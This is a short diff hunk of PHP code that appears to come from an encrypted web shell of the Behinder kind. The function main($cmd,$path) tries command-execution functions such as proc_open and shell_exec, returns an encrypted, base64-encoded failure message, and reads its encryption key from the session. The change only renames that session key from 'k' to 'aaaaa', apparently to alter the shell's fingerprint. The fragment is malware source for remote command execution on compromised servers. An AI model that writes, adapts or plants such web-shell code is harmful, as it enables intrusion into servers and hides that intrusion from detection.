@@ -80,7 +80,7 @@ function main($cmd,$path)
         $kWJW = 0;
         $result["status"] = base64_encode("fail");
         $result["msg"] = base64_encode("none of proc_open/passthru/shell_exec/exec/exec is available");
-        $key = $_SESSION['k'];
+        $key = $_SESSION['aaaaa'];
         echo encrypt(json_encode($result));
         return;
         
